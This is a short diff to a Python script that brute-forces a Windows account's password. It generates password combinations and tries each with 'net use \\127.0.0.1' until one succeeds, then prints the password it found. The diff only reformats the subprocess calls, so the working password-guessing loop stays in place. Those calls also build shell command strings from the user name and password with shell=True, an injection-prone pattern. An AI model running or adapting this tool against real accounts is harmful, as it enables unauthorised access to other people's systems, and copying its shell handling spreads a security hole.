@@ -30,7 +30,7 @@ count = 0
 combo_count = 0
 
 # --- PRECHECK USER ---
-check = subprocess.run(f'net user "{user}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+check = subprocess.run(f'net user "{user}"', stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
 if check.returncode != 0:
     with open(log_file, "a") as f:
         f.write(f"{time.ctime()} USER {user} DOES NOT EXIST!\n")
@@ -58,8 +58,12 @@ for combo in combo_generator():
 
     # --- ATTEMPT NET USE ---
     try:
-        result = subprocess.run(f'net use \\\\127.0.0.1 /user:"{user}" {combo}', 
-                                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
+        result = subprocess.run(
+            f'net use \\\\127.0.0.1 /user:"{user}" {combo}',
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.PIPE,
+            shell=True
+        )
         if result.returncode == 0:
             print(f"\n[+] PASSWORD FOUND: {combo}")
             break
